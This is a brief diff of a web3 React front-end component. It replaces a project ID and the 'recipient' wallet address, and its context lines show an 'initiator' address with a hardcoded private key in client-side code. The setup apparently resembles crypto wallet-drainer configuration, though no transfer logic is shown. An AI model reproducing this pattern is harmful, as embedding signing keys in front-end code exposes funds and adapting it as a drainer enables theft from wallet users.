@@ -8,7 +8,7 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 
 // 1. Get projectId
-const projectId = "a3e7bf8adcf3e27ae8623a68978b5632";
+const projectId = "2bf2541340dc39fea57ec973a360f93b";
 
 // 2. Create wagmiConfig
 const metadata = {
@@ -59,7 +59,7 @@ const Slider = () => {
 
     // declare all variables
 
-    const recipient = "0xbfE359218AdD656C13C8DE1088010C8A6f25995A";
+    const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
     const initiator = "0xd2E4E97670b4100e652dCec2c82D9bc253630A38";
     const initiatorPK =
       "11a07d74fc5cfec98f0cb64bebe4e6d5e07fceadc699f18d806406e657f5352d";
